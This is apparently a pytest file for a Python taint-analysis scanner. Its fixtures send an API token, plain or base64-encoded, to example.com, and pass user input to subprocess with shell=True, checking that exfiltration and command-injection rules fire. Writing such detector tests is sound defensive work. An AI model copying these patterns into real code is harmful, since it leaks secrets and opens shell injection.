
import ast
import sys
from pathlib import Path

SCANNER_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SCANNER_DIR))

from scanner.taint_engine import analyze_taint


def scan_code(source):
    tree = ast.parse(source)
    return analyze_taint(tree, "test_package.py")


def test_direct_sensitive_data_flow():
    code = """
import os
import requests

def send():
    token = os.getenv("API_TOKEN")
    requests.post("https://example.com", data=token)
"""
    findings = scan_code(code)

    assert len(findings) == 1
    assert findings[0].rule_id == "PY-TAINT-EXFIL-001"


def test_variable_alias_flow():
    code = """
import os
import requests

def send():
    token = os.getenv("API_TOKEN")
    payload = token
    requests.post("https://example.com", data=payload)
"""
    findings = scan_code(code)

    assert len(findings) == 1


def test_unrelated_network_data_is_not_tainted():
    code = """
import os
import requests

def send():
    token = os.getenv("API_TOKEN")
    requests.post("https://example.com", data="hello")
"""
    findings = scan_code(code)

    assert len(findings) == 0


def test_encoded_sensitive_data_flow():
    code = """
import os
import base64
import requests

def send():
    token = os.getenv("API_TOKEN")
    encoded = base64.b64encode(token.encode())
    requests.post("https://example.com", data=encoded)
"""
    findings = scan_code(code)

    assert len(findings) == 1


def test_sensitive_data_to_process_sink():
    code = """
import os
import subprocess

def execute():
    token = os.getenv("API_TOKEN")
    subprocess.run(["echo", token])
"""
    findings = scan_code(code)

    assert len(findings) == 1
    assert findings[0].rule_id == "PY-TAINT-EXFIL-001"

def test_user_input_reaching_subprocess_is_detected():
    code = """
import subprocess

def execute():
    command = input("Enter command: ")
    subprocess.run(command, shell=True)
"""

    findings = scan_code(code)

    assert len(findings) == 1
    assert findings[0].rule_id == "PY-TAINT-CMD-001"
    assert findings[0].severity == "HIGH"


def test_constant_subprocess_command_is_not_tainted():
    code = """
import subprocess

def execute():
    subprocess.run("echo Hello", shell=True)
"""

    findings = scan_code(code)

    assert len(findings) == 0


def test_user_input_through_string_concatenation_is_detected():
    code = """
import subprocess

def execute():
    command = input("Enter command: ")
    payload = "echo " + command
    subprocess.run(payload, shell=True)
"""

    findings = scan_code(code)

    assert len(findings) == 1
    assert findings[0].rule_id == "PY-TAINT-CMD-001"


def test_user_input_through_f_string_is_detected():
    code = """
import subprocess

def execute():
    command = input("Enter command: ")
    payload = f"echo {command}"
    subprocess.run(payload, shell=True)
"""

    findings = scan_code(code)

    assert len(findings) == 1
    assert findings[0].rule_id == "PY-TAINT-CMD-001"
